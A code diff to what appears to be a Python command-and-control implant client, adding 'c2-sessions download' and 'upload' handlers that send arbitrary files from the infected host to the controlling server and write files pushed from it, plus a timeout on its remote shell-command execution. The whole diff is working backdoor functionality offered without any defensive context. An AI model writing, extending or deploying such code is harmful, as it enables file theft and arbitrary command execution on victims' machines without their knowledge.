@@ -19,6 +19,9 @@ name = ""
 delay = 10
 os_name = platform.system()
 
+BUFFER_SIZE = 1024 #* 4
+SEPARATOR = "<SEPARATOR>"
+
 
 def send_msg(sock, msg):
     # Prefix each message with a 4-byte length (network byte order)
@@ -123,8 +126,59 @@ def sessions_shell():
                 print("c2-sessions ping")
                 send_msg(client_socket,str.encode('c2-sessions pong'))
 
-            elif cmd == 'c2-sessions download':
-                pass
+            elif 'c2-sessions download' in cmd:
+                filename = " ".join(cmd.split()[2:])
+                print(f"filename: {filename}")
+
+                if not os.path.exists(filename):
+                    file_size = -1
+                    send_msg(client_socket, f"{file_size}{SEPARATOR}".encode())
+                    continue                
+
+                try:
+                    file_size = os.path.getsize(filename)                    
+                    with open(filename, 'rb') as f:
+                        send_msg(client_socket, f"{file_size}{SEPARATOR}".encode())
+                        bytes_sent = 0
+                        while bytes_sent < file_size:
+                            chunk = f.read(1024)
+                            client_socket.sendall(chunk)
+                            bytes_sent += len(chunk)
+                except Exception as ex:
+                    file_size = -1
+                    send_msg(client_socket, f"{file_size}{SEPARATOR}{ex}".encode())                    
+
+            elif 'c2-sessions upload' in cmd:
+                # filename = " ".join(cmd.split()[2])
+                filename = cmd.split()[2]
+                print(f"filename: {filename}")
+                # filesize = " ".join(cmd.split()[3])
+                filesize = int(cmd.split()[3])
+                print(f"filesize: {filesize}")
+
+                # Receive the file size from the server
+                # received = recv_msg(client_socket).decode()                            
+                # filesize = int(received.split(SEPARATOR)[0])
+
+                if filesize > 0:                                                                
+                    try:
+                        with open(filename, 'wb') as f:                            
+                            send_msg(client_socket, f"GO!{SEPARATOR}".encode())
+                            bytes_received = 0
+                            while bytes_received < filesize:
+                                chunk = client_socket.recv(1024)
+                                f.write(chunk)
+                                bytes_received += len(chunk)
+                                    
+                        print(f"[+] File {filename} received successfully")
+                        send_msg(client_socket, f"OK{SEPARATOR}".encode())
+                    except Exception as ex:
+                        print(f'[-] Error on upload: {ex}')
+                        send_msg(client_socket, f"NOT_OK{SEPARATOR}{ex}".encode())
+                else:
+                    print(f'[-] Error on upload: -1')
+                    send_msg(client_socket, f"NOT_OK{SEPARATOR}Filesize is zero".encode())
+                                 
                 
             elif "c2-sessions cmd" in cmd:
                 command = " ".join(cmd.split()[2:])
@@ -141,7 +195,8 @@ def sessions_shell():
                         print(f'exception on chdir: {ex}')
                 
                 else:
-                    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    # timeout is used to avoid any unresponsive conditions like firing up an interactive command
+                    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=15)
                     result = output.stdout + output.stderr
                     
                 print("result: ",result)
@@ -151,7 +206,7 @@ def sessions_shell():
         except Exception as ex:
             print(f"Exception in sessions: {ex}")
             if "timed out" in str(ex):
-                print(f"timeout waiting server...")
+                print(f"timeout waiting server or command to execute ...")
                 break
             elif "Transport endpoint is not connected" in str(ex):
                 retries_counter += 1
